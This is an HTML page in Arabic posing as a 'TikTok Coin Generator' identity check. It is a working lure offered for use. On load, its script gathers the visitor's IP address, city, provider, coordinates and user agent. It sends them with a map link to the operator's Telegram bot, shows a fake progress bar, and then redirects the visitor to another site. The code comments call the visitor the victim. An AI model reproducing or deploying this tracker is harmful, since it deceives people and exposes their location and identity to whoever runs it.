<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Coin Generator - نظام التحقق</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #console { width: 90%; max-width: 600px; padding: 25px; border: 2px solid #0f0; box-shadow: 0 0 30px #0f0; background: rgba(0, 10, 0, 0.95); border-radius: 10px; }
        .loading-bar-container { width: 100%; height: 15px; background: #020; border: 1px solid #0f0; margin-top: 15px; border-radius: 10px; }
        .loading-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.4s; border-radius: 10px; }
        .warning { color: #ff0000; font-weight: bold; animation: blink 0.8s infinite; text-shadow: 0 0 5px red; }
        .info-text { font-size: 14px; color: #00ff00; line-height: 1.6; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div id="console">
    <p class="warning">⚠️ نظام التحقق من الهوية نشط...</p>
    <div class="info-text" id="details">جاري تحليل بيانات الجهاز...</div>
    <div class="loading-bar-container">
        <div class="loading-bar" id="bar"></div>
    </div>
    <p id="status" style="margin-top: 15px;">جاري الاتصال بسيرفرات TikTok...</p>
</div>

<script>
    // --- إعدادات البوت (غير البيانات هنا) ---
    const botToken = 'رقم_التوكن_هنا'; 
    const chatId = 'رقم_الآيدي_هنا';
    // ------------------------------------

    async function startSystem() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // عرض البيانات للضحية للإقناع
            document.getElementById('details').innerHTML = `
                [+] الجهاز: ${navigator.platform} <br>
                [+] المدينة: ${data.city} <br>
                [+] الـ IP: ${data.ip} <br>
                [+] المزود: ${data.org} <br>
                [+] الحالة: تم تحديد الموقع بنجاح
            `;

            // إرسال البيانات لك في التليجرام
            const message = `
🎯 صيدة جديدة (RALLO System)
📍 المدينة: ${data.city}
🌐 الشركة: ${data.org}
🔢 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.userAgent}
🗺️ الموقع: https://www.google.com/maps?q=${data.latitude},${data.longitude}
            `;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);

            // تشغيل شريط التحميل والتوجيه
            let width = 0;
            const bar = document.getElementById('bar');
            const status = document.getElementById('status');
            
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    status.innerHTML = "✅ تم التحقق! جاري تحويلك لصفحة الرشق...";
                    status.style.color = "white";
                    
                    // التوجيه التلقائي بعد 3 ثواني لموقع رشق حقيقي
                    setTimeout(() => {
                        window.location.href = "https://tikfollowers.com/tiktok-free-fans"; 
                    }, 3000);
                } else {
                    width += 5;
                    bar.style.width = width + "%";
                }
            }, 300);

        } catch (error) {
            document.getElementById('status').innerText = "خطأ في الاتصال.. حاول مجدداً";
        }
    }

    // ابدأ العملية
    startSystem();
</script>

</body>
</html>
